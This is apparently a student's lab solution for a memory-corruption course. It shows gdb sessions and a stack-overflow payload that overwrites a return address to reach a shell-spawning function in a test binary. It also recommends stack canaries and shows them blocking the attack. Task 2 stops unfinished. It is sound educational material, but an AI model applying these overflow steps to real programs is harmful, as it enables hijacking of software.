# Solution

## Task-1


not_called function memory adress:
```bash
(gdb) print not_called
$1 = {void ()} 0x8049186 <not_called>
(gdb) 
```

```bash
Breakpoint 1 at 0x80491ca: file main.c, line 12.
(gdb) run AAAAAAAAAAAA
Starting program: /home/crysys/itsec/it-security-lab/lab3-memory-corruption/task-1/app_32 AAAAAAAAAAAA
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, vulnerable_function (string=0xffffd1c9 'A' <repeats 12 times>) at main.c:12
12          strcpy(buffer, string);
(gdb) x/20x $esp
0xffffcecc:     0x00000000      0x00000000      0xf7fa0e34      0xffffcee8
0xffffcedc:     0x0804921b      0xffffd1c9      0xf7fa0e34      0x00000000
0xffffceec:     0xf7d9cc75      0x00000002      0xffffcfa4      0xffffcfb0
0xffffcefc:     0xffffcf10      0xf7fa0e34      0x0804909d      0x00000002
0xffffcf0c:     0xffffcfa4      0xf7fa0e34      0xffffcfb0      0xf7ffcb60
(gdb) 
```

Buffer start: 
```bash
0xffffcecc
```
The return address
```bash
0xffffcedc
```

the program will return here after the function

```
0xffffcedc - 0xffffcecc = 0x10
```

That's 16 => if we copy 16 bytes then we overwrite everything with it and from the 17th we can write the not_called function address, but on x86 architecture the bytes are in reverse order => 

``` bash
\x86\x91\x04\x08
```
Therefore: 
```bash
crysys@crysys-virtualbox:~/itsec/it-security-lab/lab3-memory-corruption/task-1$ ./app_32 $'AAAAAAAAAAAAAAAA\x86\x91\x04\x08'
Enjoy your shell!
```

### Stack State Analysis

#### Before


| Address | Value (Hex) | Meaning / Content |
|---------|-------------|-------------------|
| 0xffffcecc | 0x00000000 | buffer[0-3] start |
| 0xffffced0 | 0x00000000 | buffer[4-7] end |
| 0xffffced4 | 0xf7fa0e34 | Filler data / Padding |
| 0xffffced8 | 0xffffcee8 | Saved EBP (Saved EBP register) |
| 0xffffcedc | 0x0804921b | Original Return Address (main) |

#### After

| Address | Value (Hex) | Meaning / Content |
|---------|-------------|-------------------|
| 0xffffcecc | 0x41414141 | buffer overwritten ('AAAA') |
| 0xffffced0 | 0x41414141 | buffer overwritten ('AAAA') |
| 0xffffced4 | 0x41414141 | Filler data overwritten ('AAAA') |
| 0xffffced8 | 0x41414141 | Saved EBP overwritten ('AAAA') |
| 0xffffcedc | 0x08049186 | Modified Return Address (not_called) |


### Recomanded defense

- Soruce Code: replece strcpy with strncpy
- Stack Canaries Use the -fstack-protector-all compiler flag to insert a "canary" value between local variables and the return address.

### WithSSP
crysys@crysys-virtualbox:~/itsec/it-security-lab/lab3-memory-corruption/task-1$ ./app_32 $'AAAAAAAAAAAAAAAA\x86\x91\x04\x08'
*** stack smashing detected ***: terminated
Aborted (core dumped)
crysys@crysys-virtualbox:~/itsec/it-security-lab/lab3-memory-corruption/task-1$ 


## Task-2


```bash
(gdb) print now_called
$1 = {void (char *)} 0x8049186 <now_called>
(gdb) find &main, +100000 "/bin/sh"
A syntax error in expression, near `"/bin/sh"'.
(gdb) find &main, +100000, "/bin/sh"
warning: Unable to access 16007 bytes of target memory at 0x80491dd, halting search.
Pattern not found.
(gdb) print not_used
$2 = 0x804a008 "/bin/sh"
(gdb) 
```

Stack a tamadas elott: 

(gdb) x/24xw $esp
0xffffcebc:     0x00000000      0x00000000      0x0804bff4      0xffffced8
0xffffcecc:     0x08049216      0xffffd1bf      0xf7fa0e34      0x00000000
0xffffcedc:     0xf7d9cc75      0x00000002      0xffffcf94      0xffffcfa0
0xffffceec:     0xffffcf00      0xf7fa0e34      0x0804909d      0x00000002
0xffffcefc:     0xffffcf94      0xf7fa0e34      0xffffcfa0      0xf7ffcb60
0xffffcf0c:     0x00000000      0x9d3d7523      0xd138df33      0x00000000
(gdb) 


A visszateritesi cim

0xfffcebc + 16 = 0xffffcecc


Stack tamadas utan











